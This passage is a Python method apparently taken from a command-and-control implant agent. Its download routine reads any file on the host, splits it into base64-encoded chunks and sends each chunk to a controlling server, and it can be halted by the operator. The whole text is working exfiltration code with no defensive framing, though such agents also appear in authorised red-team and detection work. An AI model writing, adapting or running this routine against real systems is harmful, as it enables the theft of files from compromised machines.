    def download(self, task_id, file):
        file_path = file if file[0] == os.sep \
                else os.path.join(self.current_directory,file)

        file_size = os.stat(file_path).st_size 
        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)

        data = {
            "action": "post_response", 
            "responses": [{
                "task_id": task_id,
                "download": {
                    "total_chunks": total_chunks,
                    "full_path": file_path,
                    "chunk_size": CHUNK_SIZE
                }
            }]
        }
        initial_response = self.sendMessageAndRetrieveResponse(data)
        file_id = initial_response["responses"][0]["file_id"]
        chunk_num = 1
        with open(file_path, 'rb') as f:
            while True:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                content = f.read(CHUNK_SIZE)
                if not content:
                    break # done

                data = {
                    "action": "post_response", 
                    "responses": [
                        {
                            "task_id": task_id,
                            "download": {
                                "chunk_num": chunk_num,
                                "file_id": file_id,
                                "chunk_data": base64.b64encode(content).decode()
                            }
                        }
                    ]
                }
                chunk_num+=1
                response = self.sendMessageAndRetrieveResponse(data)
        return json.dumps({
            "agent_file_id": file_id
        })
